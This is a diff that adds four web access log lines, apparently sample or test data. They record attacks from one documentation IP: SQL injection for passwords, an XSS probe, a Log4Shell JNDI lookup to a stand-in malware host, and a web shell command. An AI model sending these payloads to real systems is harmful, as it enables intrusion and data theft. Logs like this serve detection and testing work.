@@ -1,0 +1,4 @@
+203.0.113.77 - - [30/May/2026:12:15:01 +0000] "GET /index.php?id=1+UNION+SELECT+password+FROM+users HTTP/1.1" 500 1024
+203.0.113.77 - - [30/May/2026:12:15:03 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 403 80
+203.0.113.77 - - [30/May/2026:12:15:04 +0000] "GET /?x=${jndi:ldap://pastebin-malware.example/a} HTTP/1.1" 500 120
+203.0.113.77 - - [30/May/2026:12:15:05 +0000] "GET /shell.php?cmd=whoami HTTP/1.1" 200 456
